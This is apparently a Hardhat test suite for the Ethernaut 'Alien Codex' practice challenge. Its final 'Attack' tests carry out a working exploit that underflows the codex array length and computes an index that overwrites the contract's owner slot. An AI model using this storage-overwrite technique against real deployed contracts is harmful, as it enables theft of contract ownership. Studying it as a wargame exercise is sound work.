const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");
const { array } = require("yargs");
const utils = require("../scripts/lib/utils");

const provider = ethers.provider;

describe("Ethernaut Alien Codex", function () {
    let contract;           //contracts
	let owner, addr1;       //accounts 
	
	beforeEach(async function () {
		[owner, addr1,...addrs] = await ethers.getSigners();
        
        //contract
        contract = await utils.deployContractSilent("AlienCodex");
	});
	
	describe("Initial State", function() {
		it("not contacted", async function () {
            expect(await contract.contact()).to.equal(false);
        });
        
        it("codex is empty", async function () {
            await expect(contract.codex(0)).to.be.reverted;
        });
	});
    
    describe("Contact", function () {
        it("can make contact", async function () {
            await contract.connect(addr1).make_contact();
            expect(await contract.contact()).to.equal(true);
        });

        it("contact required to record", async function () {
            await expect(contract.record(ethers.utils.formatBytes32String("X"))).to.be.reverted;
            await contract.make_contact();
            await expect(contract.record(ethers.utils.formatBytes32String("X"))).to.not.be.reverted;
        });

        it("contact required to retract", async function () {
            await expect(contract.retract()).to.be.reverted;
            await contract.make_contact();
            await expect(contract.retract()).to.not.be.reverted;
        });
    });

    describe("Record", function () {
        beforeEach(async function () {
            await contract.make_contact();
        });
        
        it("can record strings", async function () {
            await contract.connect(addr1).record(ethers.utils.formatBytes32String("zero"));
            await contract.connect(addr1).record(ethers.utils.formatBytes32String("one"));
            await contract.connect(addr1).record(ethers.utils.formatBytes32String("two"));

            expect(ethers.utils.parseBytes32String(await contract.codex(0))).to.equal("zero");
            expect(ethers.utils.parseBytes32String(await contract.codex(1))).to.equal("one");
            expect(ethers.utils.parseBytes32String(await contract.codex(2))).to.equal("two");
        });
    });

    describe("Attack", function () {
        beforeEach(async function () {
            await contract.make_contact();
        });

        it("can cause underflow", async function () {
            await expect(contract.codex(100000000)).to.be.reverted;
            await contract.retract();
            await expect(contract.codex(100000000)).to.not.be.reverted;
        });

        it("can overwrite memory", async function () {
            await contract.retract();
            await expect(contract.revise(100000000, ethers.utils.formatBytes32String("hello"))).to.not.be.reverted;
        });
        
        it("can set owner", async function () {

            const arrayStorageSlot = ethers.utils.solidityKeccak256(["uint256"], [1]);
            const arrayIndex = ethers.constants.MaxUint256.sub(BigNumber.from(arrayStorageSlot)).add(1); 

            await contract.retract();
            
            let bytes = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]; 
            bytes = bytes.concat(Array.from(ethers.utils.arrayify(addr1.address)));
            
            expect(await contract.owner()).to.equal(owner.address);
            await contract.revise(arrayIndex, bytes)
            expect(await contract.owner()).to.equal(addr1.address);
            expect(await contract.contacted()).to.equal(true);
        });
    });
});